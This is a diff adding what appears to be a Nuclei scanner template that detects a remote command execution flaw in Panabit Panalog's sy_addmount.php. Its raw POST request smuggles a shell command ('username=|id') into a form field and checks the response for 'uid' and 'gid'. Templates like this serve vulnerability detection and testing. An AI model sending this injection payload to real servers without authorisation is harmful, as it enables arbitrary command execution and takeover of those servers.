@@ -1,0 +1,33 @@
+id: panalog-sy-addmount-rce
+info:
+  name: Panabit Panalog sy_addmount.php RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Panalog log audit system's `sy_addmount.php` file has a remote command execution vulnerability. Attackers can execute arbitrary commands to take over server permissions.
+  reference:
+    - https://www.panabit.com
+    - https://fofa.so
+  tags:
+    - rce
+    - command-execution
+  classification:
+    cvss-score: 8.0
+http:
+  - raw:
+      - |
+        POST /account/sy_addmount.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        username=|id
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "uid"
+          - "gid"
